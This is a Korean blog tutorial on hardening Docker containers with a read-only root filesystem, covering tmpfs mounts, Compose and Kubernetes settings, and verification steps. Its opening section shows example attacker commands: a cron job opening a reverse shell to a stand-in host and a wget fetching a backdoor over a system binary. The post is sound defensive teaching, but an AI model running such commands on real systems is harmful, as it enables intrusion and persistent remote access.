---
title: "Docker 읽기 전용 루트 파일 시스템: --read-only 완전 활용"
description: "컨테이너 루트 파일 시스템을 읽기 전용으로 설정해 공격자의 파일 변조를 차단하는 방법, tmpfs 마운트 옵션, Compose read_only 설정, 실제 앱 적용 시 발생하는 오류 해결법을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-05-21"
archiveOrder: 5
type: "knowledge"
category: "Docker"
tags: ["docker", "security", "read-only", "tmpfs", "보안", "파일시스템", "immutable"]
featured: false
draft: false
---

[지난 글](/posts/docker-image-scan/)에서 이미지 취약점을 사전에 탐지하는 방법을 살펴봤다. 이번에는 이미 실행 중인 컨테이너에서 공격자가 파일을 변조하지 못하도록 막는 `--read-only` 옵션을 다룬다. 컨테이너 파일 시스템을 불변(immutable)으로 만들면 침해 사고의 피해를 크게 줄일 수 있다.

## 왜 읽기 전용이 필요한가

일반 컨테이너의 루트 파일 시스템은 읽기-쓰기 모드다. 공격자가 RCE(원격 코드 실행) 취약점을 이용해 컨테이너에 접근하면 다음과 같은 행위가 가능하다.

```bash
# 공격자가 할 수 있는 일 (기본 rw 컨테이너)
echo '* * * * * /bin/sh -i >& /dev/tcp/attacker.io/4444 0>&1' \
  >> /etc/cron.d/evil

# 바이너리 교체
cp /tmp/malicious-binary /usr/local/bin/node

# 백도어 설치
wget http://attacker.io/backdoor -O /usr/bin/cron
```

`--read-only`를 설정하면 루트 파일 시스템에 쓸 수 없다. 위의 모든 시도는 `Read-only file system` 오류로 차단된다.

## 기본 사용법

```bash
# read-only 컨테이너 실행
docker run --read-only myapp:latest

# /tmp 와 /run은 대부분 앱이 필요로 하므로 tmpfs로 마운트
docker run --read-only \
  --tmpfs /tmp \
  --tmpfs /run \
  myapp:latest

# tmpfs 마운트 옵션 상세 지정
docker run --read-only \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  --tmpfs /run:rw,noexec,nosuid \
  myapp:latest
```

`noexec`는 tmpfs에서 바이너리 실행을 금지하고, `nosuid`는 setuid 비트를 무력화한다. `size`로 메모리 사용량을 제한한다.

![--read-only 컨테이너 파일 시스템 구성](/assets/posts/docker-readonly-rootfs-layout.svg)

## 앱이 쓰는 경로 파악

`--read-only`를 처음 적용하면 앱이 시작 중 다양한 `Read-only file system` 오류를 낸다. `docker diff`로 앱이 어떤 경로에 쓰는지 먼저 파악한다.

```bash
# 1. 먼저 일반 모드로 컨테이너 실행 (배경 실행)
docker run -d --name probe myapp:latest

# 잠시 실행 후
sleep 5

# 2. 컨테이너가 수정한 파일/디렉터리 확인
docker diff probe
# C /run/nginx.pid           ← 런타임 PID 파일
# C /var/log/nginx           ← 로그 디렉터리
# C /tmp/app-session         ← 세션 파일
# C /app/uploads             ← 업로드 파일

# 3. 확인된 경로를 tmpfs 또는 volume으로 처리
docker rm -f probe
```

이제 각 경로를 처리한다.

```bash
docker run --read-only \
  --tmpfs /run:rw,noexec,nosuid \
  --tmpfs /var/log/nginx:rw,noexec,nosuid,size=50m \
  --tmpfs /tmp:rw,noexec,nosuid,size=100m \
  -v uploads:/app/uploads \        # 영구 보관이 필요하면 named volume
  myapp:latest
```

## Compose 설정

```yaml
services:
  web:
    image: myapp:latest
    read_only: true
    tmpfs:
      - /tmp:rw,noexec,nosuid,size=50m
      - /run:rw,noexec,nosuid
      - /var/log/nginx:rw,noexec,nosuid,size=100m
    volumes:
      - app-uploads:/app/uploads
    security_opt:
      - no-new-privileges:true

volumes:
  app-uploads:
```

![Compose에서 read-only 설정](/assets/posts/docker-readonly-rootfs-compose.svg)

## 주요 앱별 처리 패턴

### Nginx

```yaml
read_only: true
tmpfs:
  - /var/run:rw,noexec,nosuid
  - /var/cache/nginx:rw,noexec,nosuid,size=200m
  - /tmp:rw,noexec,nosuid,size=50m
```

Nginx는 `/var/run/nginx.pid`와 `/var/cache/nginx`에 쓴다.

### Node.js

```yaml
read_only: true
tmpfs:
  - /tmp:rw,noexec,nosuid,size=100m
```

대부분의 Node.js 앱은 `/tmp`에만 쓰면 된다. 업로드 파일은 외부 스토리지(S3 등)로 보내는 것이 좋다.

### Spring Boot

```yaml
read_only: true
tmpfs:
  - /tmp:rw,noexec,nosuid,size=200m
```

Spring Boot는 `/tmp`에 내장 서버 임시 파일, 세션 등을 쓴다.

## 로그를 파일 대신 stdout/stderr로

read-only 환경에서는 로그 파일을 디스크에 쓰는 것을 피하고 stdout/stderr로 출력하는 것이 이상적이다.

```python
# Python logging을 파일 대신 stdout으로
import logging
import sys

logging.basicConfig(
    level=logging.INFO,
    stream=sys.stdout,
    format='%(asctime)s %(levelname)s %(message)s'
)
```

```nginx
# nginx: 로그를 stdout/stderr로 리다이렉션
access_log /dev/stdout;
error_log  /dev/stderr;
```

Docker는 컨테이너의 stdout/stderr를 로그 드라이버로 수집하므로 파일 로그보다 더 잘 처리된다.

## 검증

```bash
# read-only 설정 확인
docker inspect mycontainer | python3 -c \
  "import sys,json; c=json.load(sys.stdin)[0]; \
   print('ReadonlyRootfs:', c['HostConfig']['ReadonlyRootfs'])"
# → ReadonlyRootfs: True

# 쓰기 시도 (실패해야 정상)
docker exec mycontainer sh -c "echo test > /usr/bin/test"
# → sh: can't create /usr/bin/test: Read-only file system

# tmpfs 쓰기 (성공해야 정상)
docker exec mycontainer sh -c "echo test > /tmp/test && cat /tmp/test"
# → test
```

## Kubernetes securityContext 연동

```yaml
spec:
  containers:
  - name: app
    securityContext:
      readOnlyRootFilesystem: true  # --read-only와 동일
      allowPrivilegeEscalation: false
      runAsNonRoot: true
      runAsUser: 1000
    volumeMounts:
    - name: tmp
      mountPath: /tmp
    - name: run
      mountPath: /run
  volumes:
  - name: tmp
    emptyDir:
      medium: Memory
      sizeLimit: 100Mi
  - name: run
    emptyDir:
      medium: Memory
```

Kubernetes의 `emptyDir: medium: Memory`가 `--tmpfs`에 해당한다.

## 성능 영향

tmpfs는 메모리에 저장되므로 디스크보다 훨씬 빠르다. `/tmp`에 자주 쓰는 앱은 오히려 성능이 향상될 수 있다. 단, 컨테이너 재시작 시 tmpfs 내용은 사라진다.

---

**지난 글:** [Docker 이미지 취약점 스캔: Trivy와 Docker Scout](/posts/docker-image-scan/)

**다음 글:** [Docker cap-drop/add: Linux Capability 최소화](/posts/docker-cap-drop-add/)

<br>
읽어주셔서 감사합니다. 😊
